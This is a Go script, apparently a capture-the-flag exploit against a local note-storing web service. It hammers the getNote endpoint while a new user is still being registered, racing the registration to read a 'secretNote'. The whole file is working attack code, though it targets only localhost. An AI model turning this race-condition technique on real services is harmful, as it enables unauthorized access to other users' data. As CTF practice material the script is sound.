package main

import (
	"ctf_cup/models"
	"encoding/json"
	"flag"
	"github.com/golang/glog"
	"github.com/google/uuid"
	"io"
	"net/http"
	"strings"
	"time"
)

const register = "http://localhost:8080/register"
const putNotePath = "http://localhost:8080/putNote"
const getNotePath = "http://localhost:8080/getNote"

const contentType = "application/json"

func main() {
	flag.Parse()
	newUser := models.Credentials{
		Login:    uuid.New().String(),
		Password: uuid.New().String(),
	}

	existUser := models.Credentials{
		Login:    uuid.New().String(),
		Password: uuid.New().String(),
	}

	RegisterUser(existUser)

	registered := make(chan bool)
	go func() {
		for {
			select {
			case <-registered:
				return
			default:
				getNote(newUser, "secretNote")
			}
		}
	}()

	go func() {
		for range time.Tick(500 * time.Millisecond) {
			putNote(existUser, uuid.New().String(), "another shitty day gone")
		}
	}()

	RegisterUser(newUser)
	registered <- true
}

func RegisterUser(creds models.Credentials) {
	credsStr, _ := json.Marshal(creds)

	post, err := http.Post(register, contentType, strings.NewReader(string(credsStr)))
	if err != nil {
		glog.Fatal(err.Error())
		return
	}
	all, _ := io.ReadAll(post.Body)
	glog.Infof("%d : %s", post.StatusCode, string(all))
}

func putNote(creds models.Credentials, name string, text string) {
	req := models.PutNoteRequest{
		Credentials: creds,
		Note: models.Note{
			Name: name,
			Text: text,
		},
	}

	reqStr, _ := json.Marshal(req)

	post, err := http.Post(putNotePath, contentType, strings.NewReader(string(reqStr)))
	if err != nil {
		glog.Fatal(err.Error())
		return
	}

	all, _ := io.ReadAll(post.Body)
	glog.Infof("%d : %s", post.StatusCode, string(all))
}

func getNote(creds models.Credentials, name string) {
	req := models.GetNoteRequest{
		Credentials: creds,
		Name:        name,
	}

	reqStr, _ := json.Marshal(req)

	post, err := http.Post(getNotePath, contentType, strings.NewReader(string(reqStr)))
	if err != nil {
		glog.Fatal(err.Error())
		return
	}

	all, _ := io.ReadAll(post.Body)
	glog.Infof("%d : %s", post.StatusCode, string(all))
}
